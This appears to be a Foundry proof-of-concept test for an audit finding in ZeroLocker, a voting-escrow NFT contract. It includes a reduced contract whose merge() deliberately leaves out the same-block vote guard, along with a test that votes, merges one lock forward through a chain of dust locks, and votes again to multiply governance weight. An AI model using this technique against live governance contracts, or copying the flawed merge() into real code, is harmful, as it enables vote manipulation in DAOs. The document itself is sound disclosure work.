// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////////////////
    ZeroLend — ZeroLocker.merge() voting-power inflation (Cantina #40818)

    Self-contained reduction of the reported finding. ZeroLocker is a
    Solidly/Curve-style voting-escrow NFT: each lock is an NFT whose voting
    power decays linearly (Point{bias, slope}). `merge(_from, _to)` moves the
    whole stake of `_from` into `_to` and burns `_from`.

    balanceOfNFT() has a same-block "flash-vote" guard:
        if (ownershipChange[_tokenId] == block.number) return 0;
    It is armed by _transferFrom (ownership moves). But `merge` — which ALSO
    moves voting power into `_to` — never sets ownershipChange[_to]. So the
    destination NFT can be voted with in the SAME block right after it received
    the inflated stake. By repeatedly merging one big lock forward through a
    chain of tiny locks and voting between each merge, a user counts the same
    stake N times.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @dev Minimal ERC20 (only what ZeroLocker needs: transfer/approve/transferFrom).
contract MockZERO {
    string public name = "ZERO";
    string public symbol = "ZERO";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _supply) {
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Faithful minimal reduction of ZeroLocker (Solidly/Curve VotingEscrow).
///      merge/balanceOfNFT/_balanceOfNFT preserved as in the audited contract;
///      the veNFT checkpoint math (user Point history) is reproduced exactly as
///      it drives balanceOfNFT — the only accounting the exploit depends on.
contract ZeroLocker {
    struct Point {
        int128 bias;
        int128 slope;
        uint256 ts;
        uint256 blk;
    }

    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    enum DepositType {
        DEPOSIT_FOR_TYPE,
        CREATE_LOCK_TYPE,
        INCREASE_LOCK_AMOUNT,
        INCREASE_UNLOCK_TIME,
        MERGE_TYPE
    }

    uint256 internal constant WEEK = 1 weeks;
    uint256 internal constant MAXTIME = 4 * 365 * 86400;
    int128 internal constant iMAXTIME = 4 * 365 * 86400;

    address public token;
    uint256 public supply;
    uint256 public tokenId;

    mapping(uint256 => address) public idToOwner;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => uint256) public userPointEpoch;
    mapping(uint256 => mapping(uint256 => Point)) internal _userPointHistory;
    mapping(uint256 => uint256) public ownershipChange;

    constructor(address _token) {
        token = _token;
    }

    // ---- ownership (minimal) ------------------------------------------------
    function _isApprovedOrOwner(address _spender, uint256 _tokenId) internal view returns (bool) {
        return idToOwner[_tokenId] == _spender;
    }

    function _mint(address _to, uint256 _tokenId) internal {
        idToOwner[_tokenId] = _to;
    }

    function _burn(uint256 _tokenId) internal {
        idToOwner[_tokenId] = address(0);
    }

    // ---- checkpoint (user Point history — drives balanceOfNFT) ---------------
    function _checkpoint(
        uint256 _tokenId,
        LockedBalance memory old_locked,
        LockedBalance memory new_locked
    ) internal {
        Point memory uOld;
        Point memory uNew;
        if (_tokenId != 0) {
            if (old_locked.end > block.timestamp && old_locked.amount > 0) {
                uOld.slope = old_locked.amount / iMAXTIME;
                uOld.bias = uOld.slope * int128(int256(old_locked.end - block.timestamp));
            }
            if (new_locked.end > block.timestamp && new_locked.amount > 0) {
                uNew.slope = new_locked.amount / iMAXTIME;
                uNew.bias = uNew.slope * int128(int256(new_locked.end - block.timestamp));
            }
            uint256 userEpoch = userPointEpoch[_tokenId] + 1;
            userPointEpoch[_tokenId] = userEpoch;
            uNew.ts = block.timestamp;
            uNew.blk = block.number;
            _userPointHistory[_tokenId][userEpoch] = uNew;
        }
    }

    function _depositFor(
        uint256 _tokenId,
        uint256 _value,
        uint256 unlock_time,
        LockedBalance memory locked_balance,
        DepositType deposit_type
    ) internal {
        LockedBalance memory _locked = locked_balance;
        supply = supply + _value;

        LockedBalance memory old_locked;
        (old_locked.amount, old_locked.end) = (_locked.amount, _locked.end);

        _locked.amount += int128(int256(_value));
        if (unlock_time != 0) {
            _locked.end = unlock_time;
        }
        locked[_tokenId] = _locked;

        _checkpoint(_tokenId, old_locked, _locked);

        // tokens are already inside the contract for a merge; only pull for real deposits
        if (_value != 0 && deposit_type != DepositType.MERGE_TYPE) {
            require(IERC20(token).transferFrom(msg.sender, address(this), _value));
        }
    }

    function createLock(uint256 _value, uint256 _lock_duration) external returns (uint256) {
        uint256 unlock_time = ((block.timestamp + _lock_duration) / WEEK) * WEEK;
        require(_value > 0, "zero value");
        require(unlock_time > block.timestamp, "too short");
        require(unlock_time <= block.timestamp + MAXTIME, "too long");

        ++tokenId;
        uint256 _tokenId = tokenId;
        _mint(msg.sender, _tokenId);
        _depositFor(_tokenId, _value, unlock_time, locked[_tokenId], DepositType.CREATE_LOCK_TYPE);
        return _tokenId;
    }

    /*//////////////////////////////////////////////////////////////////////
        VULNERABLE CODE (verbatim from ZeroLocker.sol)
    //////////////////////////////////////////////////////////////////////*/

    // @> merge() moves _from's whole stake into _to and burns _from, but never
    // @> arms the same-block flash-vote guard for _to (missing
    // @> `ownershipChange[_to] = block.number;`). The inflated _to can vote now.
    function merge(uint256 _from, uint256 _to) external {
        require(_from != _to);
        require(_isApprovedOrOwner(msg.sender, _from));
        require(_isApprovedOrOwner(msg.sender, _to));

        LockedBalance memory _locked0 = locked[_from];
        LockedBalance memory _locked1 = locked[_to];
        uint256 value0 = uint256(int256(_locked0.amount));
        uint256 end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;

        locked[_from] = LockedBalance(0, 0);
        _checkpoint(_from, _locked0, LockedBalance(0, 0));
        _burn(_from);
        _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
        // BUG: no `ownershipChange[_to] = block.number;` — see Recommendation.
    }

    function balanceOfNFT(uint256 _tokenId) external view returns (uint256) {
        if (ownershipChange[_tokenId] == block.number) return 0;
        return _balanceOfNFT(_tokenId, block.timestamp);
    }

    function _balanceOfNFT(uint256 _tokenId, uint256 _t) internal view returns (uint256) {
        uint256 _epoch = userPointEpoch[_tokenId];

        if (_epoch == 0) {
            return 0;
        } else {
            Point memory lastPoint = _userPointHistory[_tokenId][_epoch];
            lastPoint.bias -= lastPoint.slope * int128(int256(_t) - int256(lastPoint.ts));

            if (lastPoint.bias < 0) {
                lastPoint.bias = 0;
            }
            return uint256(int256(lastPoint.bias));
        }
    }
}

contract MergeVotingInflationTest is Test {
    MockZERO zeroToken;
    ZeroLocker locker;

    address bob = makeAddr("bob");
    uint256 votingPower;

    function setUp() public {
        zeroToken = new MockZERO(1_000_000_000 ether);
        locker = new ZeroLocker(address(zeroToken));
    }

    // mirrors an external governor reading a token's weight before tallying a vote
    function _vote(uint256 tokenId) internal {
        votingPower += locker.balanceOfNFT(tokenId);
    }

    function test_votingPowerInflationViaMerge() public {
        zeroToken.transfer(bob, 10_000 ether);

        vm.startPrank(bob);
        zeroToken.approve(address(locker), 1_000 ether);

        // Bob creates 1 major lock (index 0) and 9 dust locks (index 1..9).
        uint256[11] memory tokenIds;
        for (uint256 i; i < 10; i++) {
            if (i == 0) {
                tokenIds[i] = locker.createLock(100 ether, 20 weeks); // major stake
                continue;
            }
            tokenIds[i] = locker.createLock(100, 20 weeks); // dust
        }

        skip(3 weeks);

        // ---- Honest tally: the real weight Bob is entitled to ---------------
        for (uint256 i; i < 9; i++) {
            _vote(tokenIds[i]);
        }
        uint256 uninflatedVotingPower = votingPower;

        // ---- Malicious tally: vote, then merge the (inflated) lock forward ---
        votingPower = 0;
        for (uint256 i; i < 9; i++) {
            _vote(tokenIds[i]); // count current weight of lock i
            locker.merge(tokenIds[i], tokenIds[i + 1]); // shove it into lock i+1
        }
        uint256 inflatedVotingPower = votingPower;

        vm.stopPrank();

        emit log_named_uint("inflated voting power", inflatedVotingPower);
        emit log_named_uint("real voting power    ", uninflatedVotingPower);
        emit log_named_uint("inflation multiple x1e2", (inflatedVotingPower * 100) / uninflatedVotingPower);

        // HARM: the SAME stake was tallied many times over. Bob's counted
        // governance weight is a large multiple of the weight he actually owns.
        assertGt(inflatedVotingPower, uninflatedVotingPower, "no inflation");
        assertGt(
            inflatedVotingPower,
            uninflatedVotingPower * 3,
            "expected >3x inflation from repeated merge-and-vote"
        );
    }
}